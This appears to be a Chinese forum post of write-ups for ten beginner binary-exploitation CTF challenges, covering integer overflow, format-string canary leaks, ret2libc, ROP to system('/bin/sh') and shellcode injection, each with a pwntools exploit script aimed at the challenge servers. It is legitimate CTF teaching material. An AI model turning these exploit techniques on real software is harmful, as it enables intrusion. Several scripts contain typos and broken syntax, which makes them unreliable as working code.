@@ -1,0 +1,291 @@
+
+# [原创]【攻防世界】入门题题解
+
+<a href="elink@2e6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2k6s2N6G2M7X3I4V1i4K6u0W2P5r3y4@1k6W2)9J5k6h3!0J5k6#2)9J5k6h3y4F1i4K6u0r3N6r3q4K6K9#2)9J5c8Y4c8S2M7$3E0Q4y4h3k6D9K9i4y4@1i4K6y4r3N6s2W2H3k6g2)9K6c8s2m8%4L8W2)9J5y4X3&6#2L8h3u0W2M7W2)9K6c8o6u0Q4x3U0k6Y4M7X3q4V1k6g2)9K6c8o6l9`.">题目连接</a>
+
+## 1.【攻防世界】int overflow
+
+### 整型溢出
+例如当一个8位无符号数接收一个函数返回32位无符号数时，只会保留后8位
+
+### 反汇编
+可以看到首先选1，然后输入用户名和密码，这两个输入都不存在溢出，密码会被传入一个`check`函数，这个`check`函数中定义了一个8位无符号数`v3`来接受`strlen`函数返回的32位无符号数，然后`v3`大于3小于8通过判断将一个`dest`返回（这一点应该想到覆盖返回地址到后台函数或者获得flag的函数）
+
+### 思路代码
+```
+from pwn import*
+r.remote()
+address='获取flag函数的地址'
+payload=a'b'*(0x14+4)+address ##a'b'是强转为字符，ljust函数只支持字符
+payload=payload.ljust(260,a'b') ##整型溢出截断
+通过r.recvuntil和r.sendline函数接受和发送最终获取flag
+```
+
+### exp
+```python
+from pwn import*
+r=remote("111.200.241.244",63800)
+payload=b'a'*(0x14+4)+p32(0x804868B)
+payload=payload.ljust(260,b'a')
+r.recvuntil("Your choice:")
+r.sendline("1")
+r.recvuntil("Please input your username:")
+r.sendline("Nameless")
+r.recvuntil("Please input your passwd:")
+r.sendline(payload)
+r.interactive()
+```
+
+## 2.【攻防世界】Mary_Morton
+
+### 前置知识
+`canary`是一般是通过`_readsqword(0x28)`随机生成的，可以在`ida`或者`gdb`里面查看
+
+### 再谈格式化字符串漏洞
+一般格式为：`%重定位地址+p/n`: 重定位地址的格式为从原先字符到需要定位的字符的偏差+$，如：`printf(buf)`，`buf`的地址为`0x90`，需要定位到地址为`0x08`的`v2`，而且经过尝试，`printf`出真正的字符的位置偏移量为6，则重定位地址为23$. `%p`是打印地址 `%n`是将重定位处的变量的值改为"%"之前的所有字符的个数
+
+### checksec
+除了`pie`其它都开了
+
+### 反汇编
+看见先输“2”进入的地方有一个明显的字符串格式化漏洞，然后里面有个`canary`，很明显需要打印`canary`的地址。输“1”是很显而易见的栈溢出，但由于开了`canary`，明显需要用刚刚的`canary`地址进行绕过
+
+### 脚本代码
+```python
+from pwn import *
+r=remote()
+r.recvuntil("3. Exit the battle ")
+r.sendline("2")
+r.sendline("%23$p")
+r.recvuntil("0x")
+canary=int(r.recv(16),16)
+adrs=0x4008DA
+payload="a"*0x88+p64(canary)+'a'*8+p64(adrs)
+r.recvuntil("3. Exit the battle ")
+r.sendline("1")
+r.sendline(payload)
+r.interactive()
+```
+
+## 3.【攻防世界】level3
+
+### 前置知识
+linux如何解压`gz`和`tar`文件(附件中有俩文件,第一个是执行文件，第二个是它的库文件)
+```
+gzip -d filename.gz
+tar -xf fiilename
+```
+`PIE`保护：程序每次调用函数时用的地址都是随机分配的，但是相对位置是不变的
+返回地址覆盖：函数地址：32位操作系统下函数地址占4个字节，用`get`覆盖时，需要在原来栈的大小上加`0x4`
+
+### elf, plt表和got表
+```
+elf=ELF('文件相对于py文件的地址') ## 即可用elf来调用文件
+plt表：过程链接表，f函数的plt表存的是f函数到got表的地址记作：
+elf.plt['f']
+是栈中调用函数所使用的表（函数的起始地址）
+got表：全局偏移表，f函数的真正地址，记作：
+elf.got['f']
+和elf.symbols['f']应该是等价的，数据类型为8位16进制数
+```
+
+### 手动回溯
+如果需要利用两次`get`传递两个不同的`payload`，就需要手动回到`main`函数.具体做法是，将函数的返回地址设置位`main`函数地址:
+```
+elf.symbols['main']
+```
+
+### 寻址
+#### 查找函数地址
+```
+readelf -s filename|grep functioname
+```
+#### 查找字符串地址
+```
+strings -at x filename|grep 字符串(不加引号)
+```
+
+### checksec
+`leve3`很寻常，`libc`啥都开了，也就是混沌状态（`PIE`）存在，那就需要寻址，通过固定的偏移算出所需调用的函数的地址
+
+### 反汇编
+就俩函数，`write`和`read`，`read`明显溢出了，可以利用其返回到我们所需要的函数，那必然是`system`，但是没有`system`。怎么办呢？关键就在于有`read`函数和`write`函数（不妨选取`write`函数），可以用`write`函数打印`level3`文件中`write`函数在中的`got`表的地址（第一个`payload`）。然后在`libc`中找到`system`函数和字符串`'/bin/sh'`分别与`libc`中`write`函数的偏移量（每次找具体函数的地址都不一样，但偏移量是固定的）。第二个`pyload`的作用就是调用`system`函函数了。
+
+### 脚本代码
+```python
+from pwn import*
+r.remote(地址+端口)
+elf=ELF('./level3')
+payload=0x8c*'a'+p32(elf.plt['write'])+p32(elf.symbols['main'])+p32(1)+p32(elf.got['write'])+p32(10)
+r.recvuntil("Input:\n")
+r.sendline(payload)
+adrs=u32(r.recv() [:4]) ##切块，只要前四位，因为32位地址只有前四位
+payload=0x8c*'a'+p32(adrs+system偏移量)+'0000'+p32(adrs+'字符串'偏移量)
+#### '0000'是返回地址
+r.recvuntil("Input:\n")
+r.sendline(payload)
+r.interactive()
+```
+
+## 4.【攻防世界】cgpwn2
+
+### 前置知识
+32位操作系统的栈是先传入函数地址再传入参数地址
+遇事不决直接`gdb`
+
+### 反汇编
+发现前面一大坨看不懂的东西，看了网上题解才发现那是反汇编在处理寄存器，和题目没啥关系。核心就是输一个名字，然后一段字符串。`checksec`发现没有金丝雀，然后有个明显的`gets`函数和`return`函数，左边列表有一个`system`函数，这还不够明显？直接`gets`覆盖返回地址`return`到`system`函数，然后执行`system("/bin/sh")`。关键是这个“/bin/sh”怎么传？这是我们发现前面有一个`.bss`段的`name`，先传给它然后再覆盖的时候一并传入栈就行了。
+
+### 代码
+```python
+from pwn import*
+r=remote()
+payload='a'*0x26+'bbbb'+p32(system_address)+p32(name_address)
+r,recvuntil()
+r.sendline("/bin/sh")
+r.recvuntil()
+r.sendline(payload)
+r.interactive()
+```
+
+## 5.【攻防世界】cgfsb
+
+### 前置知识
+字符串格式化漏洞修改变量的值：(一):核心函数`printf("%stringn",agrv)` <=> `agrv=strlen(string)` (二):通过`printf`查找相对位置：`string='AAAA%p%p%p%p%p'`找出打印出来的16进制数中的`0X41414141`是第几位（假设是第`k`位） (三):构造`payload=p32(需要改变参数的地址)+'补位'+'%k$n'`
+
+### 脚本代码
+```python
+from pwn import *
+r=remote('111.200.241.244',65198)
+adrs=0x0804A068
+payload=p32(adrs)+'aaaa'+'%10$n'
+r.recvuntil("please tell me your name:")
+r.sendline("Nameless")
+r.recvuntil("leave your message please:")
+r.sendline(payload)
+r.interactive()
+```
+
+## 6.【攻防世界】guess num
+
+### 前置知识
+`c++` `srand` `rand`为伪随机,当传入的`seed`相同的时候，产生的随机数相同，但是有个比较坑的点就是`linux`和`windows`系统下产生的随机数不相同，所以最好调用库，在程序里面自己跑随机数。
+64位系统`unsigned int`占4个字节
+
+### 调库
+首先`linux`下`ldd`查看文件所用库，发现`c`库目录为：`/lib/x86_64-linux-gnu/libc.so.6`
+然后`python`加入下述语句：`libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")`即可用`libc.srand()`和`libc.rand()`调用`c`库中的`rand`和`srand`函数
+
+### 反汇编
+代码很明显，就是读入一个名字，然后输数字，连续10次和一个伪随机数相等即可
+
+### 思路
+用`checksec` check了一下发现开了金丝雀，但这道题仍然是用溢出覆盖来做，因为要覆盖的地址远远高于金丝雀所在。发现`gets`函数（老受害者了），然后它和`seed`隔着`ox20`的距离，所以先覆盖`0x20`的内容，并将`seed`改为我们需要的随机数即可。
+
+### 代码
+```python
+from pwn import*
+from ctypes import*
+r=remote('111.200.241.244',54792)
+libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
+payload='a'*0x20+p64(1)
+r.sendlineafter('name:',payload)
+libc.srand(1)
+for i in range(10):
+num=str(libc.rand()%6+1)
+r.sendlineafter('number:',num)
+r.interactive()
+```
+
+## 7.【攻防世界】string
+
+### 基础知识
+切片
+`senline`发送的是字符串
+用`context`来设置`pwntools`的环境：`context(arch='amd64', os='linux', log_level='debug')` 操作系统位数，操作系统，模式
+
+### 思路
+首先绕过前面的一切条件判断，然后通过字符串格式化漏洞修改参数使得通过`shellcode`区判定，最后`shellcode`获取`flag`
+
+### 反汇编
+得知是一个勇者斗恶龙的游戏，然后可以向上走也可以向左走，向上走必死，而向左走按1进入龙巢，进入龙巢需要得到女巫的馈赠（格式化漏洞修改参数），使用女巫的馈赠（`shellcode`）从而获取`flag`
+
+### exp
+```python
+from pwn import *
+r=remote("111.200.241.244",59482)
+context(arch='amd64', os='linux', log_level='debug')
+r.recvuntil('secret[0] is ')
+v4_addr=int(r.recvuntil('\n')[:-1], 16)
+r.sendlineafter("What should your character's name be:",'nameless')
+r.sendlineafter("So, where you will go?east or up?:",'east')
+r.sendlineafter("go into there(1), or leave(0)?:",'1')
+r.sendlineafter("Give me an address",str(v4_addr))
+r.sendlineafter("And, you wish is:","%85c%7$n")
+shellcode=asm(shellcraft.sh())
+r.sendlineafter("Wizard: I will help you! USE YOU SPELL",shellcode)
+r.interactive()
+```
+
+## 8.【攻防世界】Hello pwn
+
+### 保护
+只开了`NX`
+
+### Ghidra
+`ida`好像`f5`不了
+![](upload/attach/202204/943085_CXF3Y6F4QCZ2K5A.jpg)
+`FUN_400686`是一个后门，那么我们就只需要输入的`DAT`为`0x6e756161`即可
+
+### exp
+```python
+from pwn import *
+p=process('./t')
+payload=p64(0x6e756161)
+r.recvuntil('bof\n')
+r.send(payload)
+r.interactive()
+```
+
+## 9.【攻防世界】level0
+
+### 保护
+只开了`NX`
+
+### ida
+![](upload/attach/202204/943085_3ZZEAWZ697R56ZC.jpg)
+看见函数列表有个后门函数，自然想到`ret2backdoor`
+
+### exp
+```python
+from pwn import *
+p=process('./t')
+payload=0x88*'a'+p64(0x400696)
+r.recvuntil('\n')
+r.send(payload)
+r.interactive()
+```
+
+## 10.【攻防世界】level2
+
+### 保护
+还是只开了`NX`
+
+### ida
+![](upload/attach/202204/943085_EE6CEN8QT9DJQ5H.jpg)
+相较于上一道题，多了一个给`system`传参的环节，32位系统的`rop`一般为这种形式
+`payload=padding+p32(function_address)+p32(ret_address)+p32(agv1)...+p32(agvn)`
+
+### exp
+```python
+from pwn import *
+p=process('./t')
+bin_sh=0x400594
+payload=0x88*'a'+p64(0x400696)+p64(bin_sh)
+r.recvuntil('\n')
+r.send(payload)
+r.interactive()
+```
+
+[题目连接](https://bbs.kanxue.com/elink@dc0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2k6s2N6G2M7X3I4V1i4K6u0W2P5r3y4@1k6W2)9J5k6h3!0J5k6#2)9J5k6h3y4F1i4K6u0r3N6r3q4K6K9#2)9J5c8Y4c8S2M7$3E0Q4y4h3k6D9K9i4y4@1i4K6y4r3N6s2W2H3k6g2)9K6c8s2m8%4L8W2)9J5y4X3q4E0M7q4)9K6b7X3&6#2L8h3u0W2M7W2)9K6c8o6u0Q4x3U0k6S2L8i4m8Q4x3@1u0Y4M7X3q4V1k6g2)9K6c8o6l9`.)
+
